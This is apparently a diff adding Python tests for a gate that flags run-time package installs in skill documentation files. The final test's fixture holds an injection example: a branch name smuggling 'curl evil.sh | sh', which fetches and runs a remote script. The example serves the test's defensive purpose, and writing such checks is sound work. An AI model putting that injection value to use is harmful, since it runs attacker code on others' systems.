@@ -362,3 +362,61 @@ def test_a_marked_docker_fallback_passes():
         out = check(scope_repo(d, front="writes: [none]",
                                body="```sh\ndocker ps   # docker-fallback: host has no podman\n```\n"))
         assert not any("writes for podman" in v for v in out), out
+
+
+def provisioning_hits(violations):
+    """Only the provisioning rule's findings: other rules fire on these minimal trees too."""
+    return [v for v in violations if "run time" in v]
+
+
+def test_an_install_at_run_time_is_named():
+    with tempfile.TemporaryDirectory() as tmp:
+        tmp = Path(tmp)
+        fixture(tmp, {
+            "skills/alpha/probe/SKILL.md": frontmatter(extra="writes: [none]\n")
+            + "\n```sh\npip install websockets\n```\n",
+        })
+        hits = provisioning_hits(check(tmp))
+        assert hits, "pip install must fail the gate"
+        assert "probe" in hits[0]
+
+
+def test_a_marked_install_is_the_exception():
+    with tempfile.TemporaryDirectory() as tmp:
+        tmp = Path(tmp)
+        fixture(tmp, {
+            "skills/alpha/probe/SKILL.md": frontmatter(extra="writes: [none]\n")
+            + "\n```sh\nuv pip install --no-index x.whl  # nix-provision: the wheel under test\n```\n",
+        })
+        assert provisioning_hits(check(tmp)) == []
+
+
+def test_the_marker_needs_a_reason():
+    with tempfile.TemporaryDirectory() as tmp:
+        tmp = Path(tmp)
+        fixture(tmp, {
+            "skills/alpha/probe/SKILL.md": frontmatter(extra="writes: [none]\n")
+            + "\n```sh\npip install websockets  # nix-provision:\n```\n",
+        })
+        assert provisioning_hits(check(tmp)), "a bare marker is not a reason"
+
+
+def test_a_nix_shell_command_is_not_an_install():
+    with tempfile.TemporaryDirectory() as tmp:
+        tmp = Path(tmp)
+        fixture(tmp, {
+            "skills/alpha/probe/SKILL.md": frontmatter(extra="writes: [none]\n")
+            + "\n```sh\nnix shell nixpkgs#python3Packages.websockets -c python verify.py\n```\n",
+        })
+        assert provisioning_hits(check(tmp)) == []
+
+
+def test_a_comment_is_not_an_install():
+    """An injection example is documentation; a comment cannot install anything."""
+    with tempfile.TemporaryDirectory() as tmp:
+        tmp = Path(tmp)
+        fixture(tmp, {
+            "skills/alpha/probe/SKILL.md": frontmatter(extra="writes: [none]\n")
+            + '\n```yaml\n# Injection: a branch named  x"; curl evil.sh | sh; #  runs.\n```\n',
+        })
+        assert provisioning_hits(check(tmp)) == []
